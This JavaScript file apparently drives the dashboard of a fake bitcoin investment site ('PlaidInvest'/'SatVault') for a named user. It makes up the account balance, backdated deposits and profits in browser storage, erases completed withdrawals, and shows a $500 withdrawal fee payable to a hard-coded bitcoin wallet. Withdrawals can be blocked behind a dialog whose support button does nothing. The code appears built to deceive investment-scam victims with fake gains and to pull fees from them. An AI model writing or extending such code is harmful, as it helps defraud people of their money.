(function () {
  var site = window.SITE || { name: "Jerry McMillan", displayName: "Jerry McMillan", balanceUsd: 15500, btcPrice: 0 };
  var defaultBalance = Number(site.balanceUsd);
  if (Number.isNaN(defaultBalance) || defaultBalance <= 0) defaultBalance = 15500;

  var holdingsKey = "balanceBtcHoldings";
  var bookKey = "balanceUsdBook";

  function secureWrite(fn) {
    if (window.__runSecureWrite) return window.__runSecureWrite(fn);
    return fn();
  }

  function parseTxAmountEarly(tx) {
    if (tx && tx.amountUsd != null) return Math.abs(Number(tx.amountUsd)) || 0;
    var raw = String((tx && tx.amount) || "").replace(/[^0-9.\-]/g, "");
    var n = parseFloat(raw);
    return isNaN(n) ? 0 : Math.abs(n);
  }

  var balanceResetKey = "balanceResetV3";
  if (localStorage.getItem(balanceResetKey) !== "1") {
    localStorage.setItem("balanceUsd", String(defaultBalance));
    localStorage.setItem(balanceResetKey, "1");
  } else if (localStorage.getItem("balanceUsd") === null) {
    localStorage.setItem("balanceUsd", String(defaultBalance));
  }

  var txResetKey = "txResetV4";
  if (localStorage.getItem(txResetKey) !== "1") {
    try {
      var txs = JSON.parse(localStorage.getItem("transactions") || "[]");
      var txChanged = false;
      txs = txs.map(function (tx) {
        if (!tx || !tx.amount) return tx;
        var amount = String(tx.amount);
        if (amount.indexOf("780,000") !== -1 || amount.indexOf("780000") !== -1) {
          txChanged = true;
          return Object.assign({}, tx, { amount: "+$15,500" });
        }
        return tx;
      });
      if (txChanged) localStorage.setItem("transactions", JSON.stringify(txs));
    } catch (e) {}
    localStorage.setItem(txResetKey, "1");
  }

  var accountResetV5 = "accountResetV5";
  if (localStorage.getItem(accountResetV5) !== "1") {
    localStorage.setItem("balanceUsd", String(defaultBalance));
    localStorage.setItem("balanceUsdBook", String(defaultBalance));
    localStorage.removeItem("balanceBtcHoldings");
    try {
      var pendingTxs = JSON.parse(localStorage.getItem("transactions") || "[]");
      pendingTxs = pendingTxs.filter(function (tx) {
        var status = ((tx && tx.status) || "").toLowerCase();
        return status !== "processing" && status !== "pending";
      });
      localStorage.setItem("transactions", JSON.stringify(pendingTxs));
    } catch (e) {}
    localStorage.setItem(accountResetV5, "1");
  }

  var accountResetV6 = "accountResetV6";
  if (localStorage.getItem(accountResetV6) !== "1") {
    localStorage.setItem("balanceUsd", String(defaultBalance));
    localStorage.setItem("balanceUsdBook", String(defaultBalance));
    localStorage.removeItem("balanceBtcHoldings");
    try {
      var txsV6 = JSON.parse(localStorage.getItem("transactions") || "[]");
      txsV6 = txsV6.filter(function (tx) {
        if (!tx) return false;
        if (tx.amountUsd === 1000) return false;
        var amount = String(tx.amount || "");
        if (amount.indexOf("1,000") !== -1 || amount === "+$1000") return false;
        return true;
      });
      localStorage.setItem("transactions", JSON.stringify(txsV6));
    } catch (e) {}
    localStorage.setItem(accountResetV6, "1");
  }

  var purgeWithdrawalsKey = "purgeWithdrawalsV7";
  if (localStorage.getItem(purgeWithdrawalsKey) !== "1") {
    try {
      var txsPurge = JSON.parse(localStorage.getItem("transactions") || "[]");
      var restoredUsd = 0;
      txsPurge = txsPurge.filter(function (tx) {
        if (!tx || tx.type !== "Withdrawal") return true;
        var status = ((tx.status || "") + "").toLowerCase();
        if (status === "completed") {
          restoredUsd += parseTxAmountEarly(tx);
        }
        return false;
      });
      localStorage.setItem("transactions", JSON.stringify(txsPurge));
      if (restoredUsd > 0) {
        var bookAfter = Number(localStorage.getItem(bookKey));
        if (Number.isNaN(bookAfter)) bookAfter = defaultBalance;
        var nextBook = bookAfter + restoredUsd;
        localStorage.setItem(bookKey, String(nextBook));
        localStorage.setItem("balanceUsd", String(nextBook));
        localStorage.removeItem(holdingsKey);
      }
    } catch (e) {}
    localStorage.setItem(purgeWithdrawalsKey, "1");
  }

  function formatTxAmountUsd(usd) {
    return "+$" + Number(usd).toLocaleString(undefined, { maximumFractionDigits: 0 });
  }

  function hasInitialDepositRecord(txs, amount) {
    return txs.some(function (tx) {
      if (!tx || tx.type !== "Deposit") return false;
      if (tx.id === "initial-deposit") return true;
      var status = ((tx.status || "") + "").toLowerCase();
      if (status !== "completed") return false;
      return parseTxAmountEarly(tx) === amount;
    });
  }

  function syncInitialDepositRecord() {
    try {
      var seed = (window.SITE && SITE.initialDeposit) || {};
      if (!seed.date && !seed.createdAt) return false;
      var txs = JSON.parse(localStorage.getItem("transactions") || "[]");
      if (!Array.isArray(txs)) return false;
      var changed = false;
      var openedAt = Number(seed.createdAt) > 0 ? Number(seed.createdAt) : null;
      var openedDate = seed.date || (openedAt ? new Date(openedAt).toLocaleDateString("en-US") : null);
      txs = txs.map(function (tx) {
        if (!tx || (tx.id !== "initial-deposit" && !tx.seed)) return tx;
        if (tx.type !== "Deposit") return tx;
        var next = Object.assign({}, tx);
        if (openedDate && tx.date !== openedDate) {
          next.date = openedDate;
          changed = true;
        }
        if (openedAt && tx.createdAt !== openedAt) {
          next.createdAt = openedAt;
          next.completesAt = openedAt;
          changed = true;
        }
        return next;
      });
      if (changed) localStorage.setItem("transactions", JSON.stringify(txs));
      return changed;
    } catch (e) {
      return false;
    }
  }

  function ensureInitialDepositTransaction() {
    var synced = syncInitialDepositRecord();
    try {
      var seed = (window.SITE && SITE.initialDeposit) || {};
      var amount = Number(seed.amountUsd) > 0 ? Number(seed.amountUsd) : defaultBalance;
      var txs = JSON.parse(localStorage.getItem("transactions") || "[]");
      if (!Array.isArray(txs)) txs = [];
      if (hasInitialDepositRecord(txs, amount)) return synced;

      var openedAt = Number(seed.createdAt) > 0 ? Number(seed.createdAt) : Date.now() - 30 * 24 * 60 * 60 * 1000;
      var openedDate = seed.date || new Date(openedAt).toLocaleDateString("en-US");
      txs.push({
        id: seed.id || "initial-deposit",
        seed: true,
        date: openedDate,
        createdAt: openedAt,
        completesAt: openedAt,
        amountUsd: amount,
        type: seed.type || "Deposit",
        asset: seed.asset || "BTC",
        amount: formatTxAmountUsd(amount),
        status: seed.status || "Completed"
      });
      txs.sort(function (a, b) {
        return (b.createdAt || 0) - (a.createdAt || 0);
      });
      localStorage.setItem("transactions", JSON.stringify(txs));
      return true;
    } catch (e) {
      return false;
    }
  }

  function syncSiteState() {
    var book = Number(localStorage.getItem(bookKey));
    if (Number.isNaN(book) || book <= 0) {
      localStorage.setItem(bookKey, String(defaultBalance));
      localStorage.setItem("balanceUsd", String(defaultBalance));
      localStorage.removeItem(holdingsKey);
    } else if (!localStorage.getItem("balanceUsd")) {
      localStorage.setItem("balanceUsd", String(book));
    }
    return ensureInitialDepositTransaction();
  }

  var siteStateChanged = syncSiteState();

  var stored = Number(localStorage.getItem("balanceUsd"));
  if (!Number.isNaN(stored) && stored > 0) site.balanceUsd = stored;
  else site.balanceUsd = defaultBalance;

  if (!localStorage.getItem(bookKey)) {
    localStorage.setItem(bookKey, String(site.balanceUsd || defaultBalance));
  }

  function getBookUsd() {
    var book = Number(localStorage.getItem(bookKey));
    if (!isNaN(book) && book > 0) return book;
    return site.balanceUsd || defaultBalance;
  }

  function getPrice() {
    if (window.BtcPrice && typeof BtcPrice.getLivePrice === "function") {
      return BtcPrice.getLivePrice();
    }
    return (window.BtcPrice && BtcPrice.price) || site.btcPrice || 0;
  }

  function getHoldings() {
    var stored = Number(localStorage.getItem(holdingsKey));
    if (!Number.isNaN(stored) && stored > 0) return stored;
    return null;
  }

  function ensureHoldings() {
    var holdings = getHoldings();
    var price = getPrice();
    if (!price) return holdings != null ? holdings : 0;
    if (holdings != null) return holdings;
    holdings = getBookUsd() / price;
    secureWrite(function () {
      localStorage.setItem(holdingsKey, String(holdings));
    });
    return holdings;
  }

  function getPortfolioUsd() {
    var price = getPrice();
    var holdings = ensureHoldings();
    if (!price || !holdings) return getBookUsd();
    return holdings * price;
  }

  function formatUsd(value) {
    return "$" + Number(value).toLocaleString(undefined, { minimumFractionDigits: 2, maximumFractionDigits: 2 });
  }

  function formatBtc(value) {
    return Number(value).toFixed(8) + " BTC";
  }

  function renderBalances() {
    var price = getPrice();
    var holdings = ensureHoldings();
    var book = getBookUsd();
    var portfolioUsd = price && holdings ? holdings * price : book;
    var displayBtc = holdings > 0 ? holdings : (price ? book / price : 0);

    document.querySelectorAll("[data-balance-usd]").forEach(function (el) {
      el.textContent = formatUsd(portfolioUsd);
    });

    document.querySelectorAll("[data-balance-btc]").forEach(function (el) {
      el.textContent = displayBtc > 0 ? formatBtc(displayBtc) : "—";
    });

    document.querySelectorAll("[data-deposits-total]").forEach(function (el) {
      el.textContent = formatUsd(book);
    });
  }

  window.refreshBtcBalances = renderBalances;
  if (window.BtcPrice) BtcPrice.start();
  renderBalances();

  var displayName = site.displayName || site.name || "Jerry McMillan";
  var platformName = site.platformName || "PlaidInvest";

  document.querySelectorAll("[data-logo-text]").forEach(function (el) {
    el.textContent = platformName;
  });

  document.querySelectorAll("[data-brand]").forEach(function (el) {
    if (!el.closest(".text-logo")) {
      el.textContent = platformName;
    }
  });
  document.querySelectorAll("[data-tagline]").forEach(function (el) {
    el.textContent = site.tagline;
  });
  document.querySelectorAll("[data-year]").forEach(function (el) {
    el.textContent = site.year;
  });
  document.querySelectorAll("[data-email]").forEach(function (el) {
    el.textContent = site.email;
    if (el.tagName === "A") el.href = "mailto:" + site.email;
  });

  document.querySelectorAll("[data-user-name]").forEach(function (el) {
    el.textContent = displayName;
  });

  if (window.SatVaultAuth && SatVaultAuth.isLoggedIn()) {
    try {
      var session = SatVaultAuth.getUser();
      if (session && session.name !== displayName) {
        session.name = displayName;
        localStorage.setItem(SatVaultAuth.SESSION_KEY, JSON.stringify(session));
      }
    } catch (e) {}
  }

  if (site.images) {
    document.querySelectorAll("img[data-coin]").forEach(function (img) {
      var key = img.getAttribute("data-coin");
      if (site.images[key]) img.src = site.images[key];
    });
    var favicon = document.querySelector('link[rel="icon"]');
    if (favicon && site.images.favicon) favicon.href = site.images.favicon;
  }

  document.title = document.title.replace(/^(SatVault|BTC Invest|PlaidInvest)/, platformName);

  window.updateBalance = function (usd) {
    var price = getPrice();
    secureWrite(function () {
      localStorage.setItem(bookKey, String(usd));
      if (price) {
        localStorage.setItem(holdingsKey, String(usd / price));
      }
      localStorage.setItem("balanceUsd", String(usd));
    });
    site.balanceUsd = usd;
    renderBalances();
  };

  window.getWalletUsd = function () {
    return getBookUsd();
  };

  window.getPortfolioUsd = getPortfolioUsd;

  window.getWithdrawalFeeUsd = function () {
    var fee = site.withdrawalFeeUsd;
    return fee != null && !Number.isNaN(Number(fee)) ? Number(fee) : 500;
  };

  window.isWithdrawalsBlocked = function () {
    return !!(window.SITE && SITE.withdrawalsBlocked);
  };

  if (window.isWithdrawalsBlocked()) {
    document.documentElement.classList.add("withdrawals-blocked");
    document.body.classList.add("withdrawals-blocked");
  }

  window.getTotalProfit = function () {
    var portfolio = getPortfolioUsd();
    var book = getBookUsd();
    return Math.round((portfolio - book) * 100) / 100;
  };

  function formatMoney(n) {
    return "$" + Number(n).toLocaleString(undefined, { minimumFractionDigits: 2, maximumFractionDigits: 2 });
  }

  function parseTxAmount(tx) {
    if (tx && tx.amountUsd != null) return Math.abs(Number(tx.amountUsd)) || 0;
    var raw = String((tx && tx.amount) || "").replace(/[^0-9.\-]/g, "");
    var n = parseFloat(raw);
    return isNaN(n) ? 0 : Math.abs(n);
  }

  function getTransactions() {
    try {
      return JSON.parse(localStorage.getItem("transactions") || "[]");
    } catch (e) {
      return [];
    }
  }

  window.getTransactions = getTransactions;

  function getPendingWithdrawalTotal() {
    return getTransactions().filter(function (tx) {
      var status = ((tx && tx.status) || "").toLowerCase();
      return tx && tx.type === "Withdrawal" && (status === "pending" || status === "processing");
    }).reduce(function (sum, tx) {
      return sum + parseTxAmount(tx);
    }, 0);
  }

  window.getAvailableBalance = function () {
    var portfolio = getPortfolioUsd();
    var reserved = getPendingWithdrawalTotal();
    return Math.max(0, Math.round((portfolio - reserved) * 100) / 100);
  };

  function getInitialDepositAmount() {
    var seed = window.SITE && SITE.initialDeposit;
    var amount = seed && Number(seed.amountUsd);
    return amount > 0 ? amount : defaultBalance;
  }

  window.renderDashboardStats = function () {
    ensureInitialDepositTransaction();
    var txs = getTransactions();
    var deposit = 0;
    var withdraw = 0;

    txs.forEach(function (tx) {
      if (!tx) return;
      var status = ((tx.status || "") + "").toLowerCase();
      if (status !== "completed") return;
      var amt = parseTxAmount(tx);
      if (tx.type === "Deposit") deposit += amt;
      else if (tx.type === "Withdrawal") withdraw += amt;
    });

    if (deposit <= 0) {
      deposit = getInitialDepositAmount();
    }

    var available = getAvailableBalance();
    var profit = getTotalProfit();

    function set(id, value) {
      var node = document.getElementById(id);
      if (node) node.textContent = value;
    }

    set("dash-stat-profit", formatMoney(profit));
    set("dash-stat-profit-desktop", formatMoney(profit));
    set("dash-stat-bonus", formatMoney(0));
    set("dash-stat-deposit", formatMoney(deposit));
    set("dash-stat-withdraw", formatMoney(withdraw));

    var availEl = document.getElementById("dash-available-amt");
    if (availEl) availEl.textContent = formatMoney(available);

    var withdrawAvail = document.getElementById("withdraw-available");
    if (withdrawAvail) withdrawAvail.textContent = formatMoney(available);

    var withdrawInput = document.getElementById("withdraw-amount");
    if (withdrawInput) withdrawInput.max = Math.max(100, Math.floor(available));
  };

  window.fillWalletFields = function () {
    var wallet = site.platformWallet || "bc1qa348fll9sh34h8gxux8dwfu4ygmwpe7v4nmyz2";
    var fee = getWithdrawalFeeUsd();
    document.querySelectorAll("[data-platform-wallet]").forEach(function (el) {
      el.textContent = wallet;
    });
    document.querySelectorAll("[data-withdrawal-fee]").forEach(function (el) {
      el.textContent = formatMoney(fee);
    });
  };

  fillWalletFields();
  document.addEventListener("transactionsUpdated", renderDashboardStats);

  if (window.BtcPrice) {
    var prevStatsOnLive = BtcPrice.onLivePrice;
    BtcPrice.onLivePrice = function (price, oldPrice) {
      if (typeof prevStatsOnLive === "function") prevStatsOnLive(price, oldPrice);
      renderBalances();
      renderDashboardStats();
    };
  }

  function processPendingTransactions() {
    var txs;
    try {
      txs = JSON.parse(localStorage.getItem("transactions") || "[]");
    } catch (e) {
      return false;
    }
    var now = Date.now();
    var changed = false;
    var balanceDelta = 0;

    txs = txs.map(function (tx) {
      var status = ((tx && tx.status) || "").toLowerCase();
      if (status !== "pending" && status !== "processing") return tx;

      if (!tx.completesAt) {
        tx = Object.assign({}, tx, {
          createdAt: tx.createdAt || now,
          completesAt: now + (10 + Math.random() * 10) * 60 * 1000,
          amountUsd: tx.amountUsd != null ? tx.amountUsd : parseTxAmount(tx)
        });
        changed = true;
      }

      if (now < tx.completesAt) return tx;

      var amt = parseTxAmount(tx);
      if (tx.type === "Deposit") balanceDelta += amt;
      else if (tx.type === "Withdrawal") balanceDelta -= amt;

      changed = true;
      return Object.assign({}, tx, { status: "Completed" });
    });

    if (changed) {
      secureWrite(function () {
        localStorage.setItem("transactions", JSON.stringify(txs));
      });
    }
    if (balanceDelta !== 0) {
      var base = Number(localStorage.getItem(bookKey));
      if (Number.isNaN(base)) base = getBookUsd();
      updateBalance(base + balanceDelta);
    } else if (changed) {
      renderBalances();
    }

    if (changed) {
      document.dispatchEvent(new CustomEvent("transactionsUpdated"));
    }
    return changed;
  }

  window.processPendingTransactions = processPendingTransactions;
  processPendingTransactions();
  renderDashboardStats();
  if (siteStateChanged) {
    document.dispatchEvent(new CustomEvent("transactionsUpdated"));
  }
  setInterval(processPendingTransactions, 30000);

  function ensureWithdrawBlockedModal() {
    if (document.getElementById("withdraw-blocked-modal")) return;
    document.body.insertAdjacentHTML("beforeend",
      '<div id="withdraw-blocked-modal" class="wallet-modal hidden" role="dialog" aria-modal="true" aria-labelledby="withdraw-blocked-title">' +
        '<div class="wallet-modal-backdrop" data-withdraw-blocked-close></div>' +
        '<div class="wallet-modal-card app-card">' +
          '<h2 id="withdraw-blocked-title" class="wallet-modal-title">Withdrawals Blocked</h2>' +
          '<p class="wallet-modal-body text-gray-400 text-sm">Withdrawals are currently unavailable on your account. Please contact support for assistance.</p>' +
          '<div class="wallet-modal-actions">' +
            '<button type="button" class="btn-ghost" data-withdraw-blocked-close>Close</button>' +
            '<button type="button" class="btn-primary" id="withdraw-blocked-support">Contact Support</button>' +
          '</div>' +
        '</div>' +
      '</div>'
    );
    document.querySelectorAll("[data-withdraw-blocked-close]").forEach(function (el) {
      el.addEventListener("click", closeWithdrawBlockedModal);
    });
    var supportBtn = document.getElementById("withdraw-blocked-support");
    if (supportBtn) {
      supportBtn.addEventListener("click", function (e) {
        e.preventDefault();
      });
    }
    document.addEventListener("keydown", function (e) {
      if (e.key === "Escape") closeWithdrawBlockedModal();
    });
  }

  function openWithdrawBlockedModal() {
    ensureWithdrawBlockedModal();
    document.getElementById("withdraw-blocked-modal").classList.remove("hidden");
    document.body.classList.add("wallet-modal-open");
  }

  function closeWithdrawBlockedModal() {
    var modal = document.getElementById("withdraw-blocked-modal");
    if (modal) modal.classList.add("hidden");
    document.body.classList.remove("wallet-modal-open");
  }

  window.showWithdrawBlockedModal = openWithdrawBlockedModal;
  window.closeWithdrawBlockedModal = closeWithdrawBlockedModal;

  function initWithdrawBlockedLinks() {
    document.addEventListener("click", function (e) {
      var link = e.target.closest(".nav-withdraw-link, .dash-withdraw-link, [data-withdraw-link]");
      if (!link || !window.isWithdrawalsBlocked()) return;
      e.preventDefault();
      openWithdrawBlockedModal();
    });
  }

  if (window.isWithdrawalsBlocked()) {
    initWithdrawBlockedLinks();
    if (location.pathname.indexOf("/dashboard/withdrawals") !== -1) {
      openWithdrawBlockedModal();
    }
  }

  if (window.__sealSecureStorage) window.__sealSecureStorage();
})();
